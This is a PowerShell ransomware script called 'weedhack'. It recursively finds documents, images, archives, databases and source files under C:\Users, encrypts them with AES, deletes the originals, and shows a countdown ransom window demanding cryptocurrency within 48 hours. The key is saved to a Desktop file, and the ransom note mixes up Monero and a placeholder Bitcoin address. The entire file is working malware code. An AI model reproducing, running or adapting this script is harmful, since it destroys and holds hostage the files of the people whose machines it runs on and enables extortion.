$Target = "C:\Users"
$Extension = ".weedhack"
$Delay = 30
$FileTypes = @('.txt', '.pdf', '.docx', '.xlsx', '.xls', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar', '.7z', '.tar', '.gz', '.sql', '.mdb', '.db', '.json', '.xml', '.config', '.py', '.js', '.java', '.cpp', '.cs', '.html', '.css', '.php')

Write-Host "========================================" -ForegroundColor Red
Write-Host "          weed          " -ForegroundColor Red
Write-Host "       Extension: $Extension            " -ForegroundColor Red
Write-Host "       Targets: $($FileTypes.Count) file types" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red


$aes = [System.Security.Cryptography.Aes]::Create()
$key = $aes.Key
$iv = $aes.IV
$encryptor = $aes.CreateEncryptor()
$count = 0


Write-Host "Scanning for target files..." -ForegroundColor Yellow
$files = @()
Get-ChildItem $Target -Recurse -File -ErrorAction SilentlyContinue | 
    Where-Object { 
        $_.Extension -in $FileTypes -and 
        $_.Extension -ne $Extension -and 
        $_.Length -lt 100MB -and
        $_.FullName -notmatch '\\Windows\\|\\Program Files\\|\\ProgramData\\|\\Temp\\|\\AppData\\Local\\Microsoft\\'
    } | 
    ForEach-Object { $files += $_.FullName }

Write-Host "Found $($files.Count) target files" -ForegroundColor Yellow


Write-Host "Encrypting files..." -ForegroundColor Yellow
foreach ($filePath in $files) {
    try {
 
        $data = [IO.File]::ReadAllBytes($filePath)
        $encrypted = $encryptor.TransformFinalBlock($data, 0, $data.Length)
        

        [IO.File]::WriteAllBytes($filePath + $Extension, $iv + $encrypted)
        

        [IO.File]::Delete($filePath)
        
        $count++
        if ($count % 500 -eq 0) { 
            Write-Host "[$count/$($files.Count)]" -NoNewline 
        } elseif ($count % 100 -eq 0) {
            Write-Host "." -NoNewline
        }
    } catch {
     
        continue
    }
}

Write-Host "`n`nEncrypted $count/$($files.Count) files with $Extension" -ForegroundColor Green


$keyB64 = [Convert]::ToBase64String($key)
$ivB64 = [Convert]::ToBase64String($iv)
"WEEDHACK RECOVERY KEY`n=====================`nAES Key (Base64): $keyB64`nAES IV (Base64): $ivB64`nFiles: $count`nExtension: $Extension" | 
    Out-File "$env:USERPROFILE\Desktop\WEEDHACK_RECOVERY_KEY.txt"

# Form
$form = New-Object Windows.Forms.Form
$form.Size = New-Object Drawing.Size(720, 500)
$form.Text = "OOPS! YOUR FILES HAVE BEEN ENCRYPTED"
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.FormBorderStyle = "FixedDialog"
$form.BackColor = [Drawing.Color]::FromArgb(40, 44, 52)  # Dark background

# Common font
$fontHeader = New-Object Drawing.Font("Segoe UI", 14, [Drawing.FontStyle]::Bold)
$fontNormal = New-Object Drawing.Font("Segoe UI", 11)

# Label: Title
$labelTitle = New-Object Windows.Forms.Label
$labelTitle.Text = "ALL OF YOUR FILES HAVE BEEN ENCRYPTED!"
$labelTitle.AutoSize = $true
$labelTitle.Location = New-Object Drawing.Point(20, 20)
$labelTitle.ForeColor = [Drawing.Color]::White
$labelTitle.Font = $fontHeader
$form.Controls.Add($labelTitle)

# Label: Encrypted files
$labelFiles = New-Object Windows.Forms.Label
$labelFiles.Text = "Encrypted: $count files"
$labelFiles.AutoSize = $true
$labelFiles.Location = New-Object Drawing.Point(20, 60)
$labelFiles.ForeColor = [Drawing.Color]::LightGray
$labelFiles.Font = $fontNormal
$form.Controls.Add($labelFiles)

# Label: Send
$labelSend = New-Object Windows.Forms.Label
$labelSend.Text = "Send 0.25 Monero to: bc1qweedhackaddressxxxxxxxxxxxxx to get your files back"
$labelSend.AutoSize = $true
$labelSend.Location = New-Object Drawing.Point(20, 90)
$labelSend.ForeColor = [Drawing.Color]::White
$labelSend.Font = $fontNormal
$form.Controls.Add($labelSend)

# Textbox
$textbox = New-Object Windows.Forms.TextBox
$textbox.Multiline = $true
$textbox.Text = "All your documents, images, videos, and archives have been encrypted.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`n`nPayment address: bc1qweedhackaddressxxxxxxxxxxxxx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently.."
$textbox.Size = New-Object Drawing.Size(660, 250)
$textbox.Location = New-Object Drawing.Point(20, 120)
$textbox.ReadOnly = $true
$textbox.ScrollBars = "Vertical"
$textbox.BackColor = [Drawing.Color]::FromArgb(60, 63, 70)
$textbox.ForeColor = [Drawing.Color]::White
$textbox.Font = $fontNormal
$textbox.BorderStyle = "FixedSingle"
$form.Controls.Add($textbox)

# Timer Label
$timerLabel = New-Object Windows.Forms.Label
$timerLabel.Location = New-Object Drawing.Point(20, 390)
$timerLabel.AutoSize = $true
$timerLabel.ForeColor = [Drawing.Color]::Orange
$timerLabel.Font = New-Object Drawing.Font("Segoe UI", 16, [Drawing.FontStyle]::Bold)
$timerLabel.Text = "Timer: $Delay"
$form.Controls.Add($timerLabel)

# Button example (if needed)
$buttonClose = New-Object Windows.Forms.Button
$buttonClose.Text = "Close"
$buttonClose.Size = New-Object Drawing.Size(120, 35)
$buttonClose.Location = New-Object Drawing.Point(560, 390)
$buttonClose.Font = $fontNormal
$buttonClose.BackColor = [Drawing.Color]::FromArgb(220, 53, 69)
$buttonClose.ForeColor = [Drawing.Color]::White
$buttonClose.FlatStyle = "Flat"
$buttonClose.Add_Click({ $form.Close() })
$form.Controls.Add($buttonClose)

$form.Add_Shown({
    $timer = $Delay
    while ($timer -gt 0) {
        $timerLabel.Text = "Window closes in: $timer seconds"
        $timerLabel.ForeColor = if ($timer -lt 10) { "Red" } else { "Green" }
        $form.Refresh()
        Start-Sleep 1
        $timer--
    }
    $form.Close()
})

[void]$form.ShowDialog()

Write-Host "Ransom note displayed for $Delay seconds" -ForegroundColor Yellow
Write-Host "Recovery key saved to Desktop" -ForegroundColor Yellow
